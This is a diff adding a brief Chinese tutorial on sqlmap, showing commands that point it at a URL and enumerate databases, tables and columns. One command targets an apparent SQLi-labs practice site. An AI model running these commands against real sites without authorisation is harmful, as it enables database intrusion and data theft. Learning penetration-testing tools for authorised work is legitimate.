@@ -1,0 +1,8 @@
+sqlmap是一种自动化的SQL注入和数据库接管工具，它支持六种SQL注入技术
+在使用SQLMAP时：
+首先，你需要输入你想要检测的网站的URL，并加上-u参数。例如：sqlmap -u http://example.com
+ sqlmap -u http://sqlilabs.njhack.xyz/Less-5?id=1 --dbs 
+
+然后，你可以使用–dbs参数来列出数据库中存在的数据库。例如：sqlmap -u http://example.com --dbs
+接着，你可以使用-D参数来指定一个数据库，并使用–tables参数来列出该数据库中的表。例如：sqlmap -u http://example.com -D exampledb --tables
+最后，你可以使用-T参数来指定一个表，并使用–columns参数来列出该表中的列。例如：sqlmap -u http://example.com -D exampledb -T exampletable --columns
